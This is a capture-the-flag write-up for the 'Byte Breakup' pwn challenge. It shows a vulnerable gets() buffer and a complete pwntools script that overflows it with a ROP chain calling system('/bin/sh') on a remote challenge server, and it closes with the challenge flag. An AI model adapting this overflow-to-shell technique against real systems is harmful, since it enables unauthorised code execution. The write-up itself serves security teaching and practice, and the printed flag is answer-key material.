# [Pwn] Byte Breakup

## 📚 Overview

> *"Welcome to 'Byte Breakup,' where an old program is stuck in a code-cial relationship with a bug—the ex-girlfriend kind! She left a glitchy surprise, and now it's up to you to debug the drama away. Can you charm your way through its defenses and make it sing? Get ready for a byte-sized comedy of errors as you unravel the mysteries left by your digital ex!"*

## 🔎 *Reconnaissance*

Buffer overflow vulnerability and [ret2libc](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc).

```c
void vuln(void){
  char local_28 [32];
  
  puts("Enter the password: ");
  gets(local_28);
  puts("Wrong password\n");
  return;
}
```

```c
void soClose(void){
  system("/bin/ls");
  return;
}
```

## ✨ Solution

We can utilise [pwntools](https://github.com/Gallopsled/pwntools) for the exploitation.

```py
from pwn import *
elf = context.binary = ELF("./vuln", checksec=False)

# p = process("./vuln")
p = remote("34.125.199.248", 6969)
p.debug()

rop = ROP(elf)
RET_ADDR = 0x401020
BINSH_ADDR = next(elf.search(b'/bin/sh\x00'))
rop.raw(RET_ADDR)
rop.system(BINSH_ADDR)

payload = b'A'*0x28 + rop.chain()

p.sendlineafter(b'Enter the password: ', payload)
p.interactive()
```

For the payload, we will insert the padding first to fill the `local_28` var and then followed by the ROP chain, which call the system function to spawn the shell and return *safely*. *idk, this script worked on the server lol.*

*retrieve RET address using `ROPgadget --binary vuln | grep ret` command.*<br>
*retrieve BINSH address using pwntools.*

## 🏳️ Flag

`OSCTF{b1t_byt3_8r3akup}`